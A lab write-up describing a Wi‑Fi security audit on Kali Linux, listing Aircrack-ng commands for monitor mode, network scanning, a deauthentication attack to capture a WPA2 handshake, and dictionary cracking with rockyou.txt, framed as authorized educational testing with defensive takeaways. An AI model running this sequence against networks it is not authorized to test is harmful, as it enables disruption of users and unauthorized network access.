# Project 5: Wi‑Fi Security Auditing Using Aircrack-ng on Kali Linux

## Introduction
In this project, I performed a Wi‑Fi security audit using Aircrack-ng on Kali Linux within an authorized lab environment. My objective was to understand how wireless networks can be assessed for vulnerabilities, how handshakes are captured, and how weak Wi‑Fi passwords can be identified through controlled testing.

This hands-on exercise helped me understand wireless attack surfaces and reinforced the importance of strong Wi‑Fi security configurations.

---

## Lab Environment

### Setup Overview

Attacker Machine: Kali Linux  
Target Network: Personal/Test Wi‑Fi Router (Authorized)  
Client Device: Connected Wi‑Fi Device (Lab Environment)

Kali Linux ↔ Wi‑Fi Router ↔ Client Device

---

## Tools Used

- Kali Linux (penetration testing OS)
- Aircrack-ng Suite (wireless auditing tools)
- Wi‑Fi Adapter supporting Monitor Mode
- Wireshark (packet analysis tool)
- Wordlists for password testing

---

## Verifying Installation

Aircrack-ng is pre-installed on Kali Linux. I verified or updated it using:

```bash
sudo apt-get update && sudo apt-get install aircrack-ng
```

---

## Activities Performed

### 1. Enabling Monitor Mode

First, I identified my wireless interface:

```bash
iwconfig
```

Then I enabled monitor mode:

```bash
sudo airmon-ng start wlan0
```

This placed my wireless adapter into monitor mode (typically renamed to `wlan0mon`), allowing passive packet capture.

---

### 2. Discovering Nearby Wi‑Fi Networks

I scanned for available wireless networks:

```bash
sudo airodump-ng wlan0mon
```

This allowed me to observe:
- SSIDs
- BSSIDs
- Channels
- Signal strength
- Encryption types (WEP/WPA/WPA2)

---

### 3. Capturing WPA/WPA2 Handshake

I targeted my authorized test network and captured handshake packets:

```bash
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w capture wlan0mon
```

To simulate reconnection and capture the handshake, I performed a controlled deauthentication:

```bash
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

Once successful, the handshake was saved in the capture file.

---

### 4. Password Cracking Attempt (Dictionary Attack)

Using a wordlist, I attempted to recover the Wi‑Fi password:

```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

This demonstrated how weak passwords can be recovered using dictionary attacks if not properly secured.

---

### 5. Packet Analysis

To better understand the handshake process and traffic patterns, I analyzed the capture file:

```bash
sudo wireshark capture-01.cap
```

This helped me examine:
- Authentication exchanges
- Handshake sequence
- Wireless traffic behavior

---

## Key Skills Demonstrated

- Wireless network reconnaissance
- Monitor mode configuration
- Packet capture and handshake analysis
- WPA/WPA2 password auditing
- Dictionary attack methodology
- Wireless packet inspection using Wireshark
- Understanding Wi‑Fi security weaknesses

---

## Conclusion

Through this project, I gained practical experience in auditing wireless network security in a controlled lab environment. This exercise strengthened my understanding of how weak Wi‑Fi passwords and poor configurations can expose networks to compromise.

It reinforced the importance of:
- Strong WPA2/WPA3 passwords
- Disabling WPS
- Keeping firmware updated
- Monitoring wireless activity

All testing was conducted in an authorized environment for educational and security research purposes.
